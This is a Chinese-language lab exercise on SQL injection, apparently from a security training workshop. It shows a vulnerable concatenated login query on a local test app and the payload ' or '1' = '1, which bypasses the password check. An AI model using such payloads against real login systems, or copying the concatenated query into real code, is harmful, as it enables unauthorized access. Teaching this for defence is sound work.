# A1: Injection

## 目標

>透過 SQL Injection ，不需正確密碼即可登入系統

## 練習步驟

1. 開啟 Chrome 在 Url 中輸入 **<http://localhost:44375/Account/Login>**

2. 畫面輸入

    | 欄位 | 值  |
    |---|---|
    | Email | a@gss.com |
    | Password | ' |
    | Remember me | 不勾選 |

3. 按下 「**Login**」 Button

4. 可以看見畫面出現以下的程式

    >SELECT * FROM Users Where Email = '{email}' and Password = '{password}'

        執行的程式如下
    > SELECT * FROM Users Where Email = 'a@gss.com' and Password = ''' Order By Email desc

    因為用串接的，所以可以變化的就是在 password 的地方

    ```sql
    SELECT * FROM Users Where Email = '{email}' and Password = '
    <<這裡可以搞怪>>
    '
    ```

5. 回到 **<http://localhost:44375/Account/Login>**

6. 畫面輸入

    | 欄位 | 值  |
    |---|---|
    | Email | a@gss.com |
    | Password | **' or '1' = '1** |
    | Remember me | 不勾選 |

7. 按下 「**Login**」 Button

8. 可以順利登入系統

    ```sql
    SELECT * FROM Users Where Email = 'a@gss.com' and Password = '' or '1' = '1' Order By Email desc
    ```

9. 除了輸入 ' or '1' = '1 外，還可以輸入什麼值來達到不需正確密碼就登入系統呢?

>SQL Injection 的修正請參考 todo: Session-3-1 SQL Injection Fix

[Back](./../../readme.md)
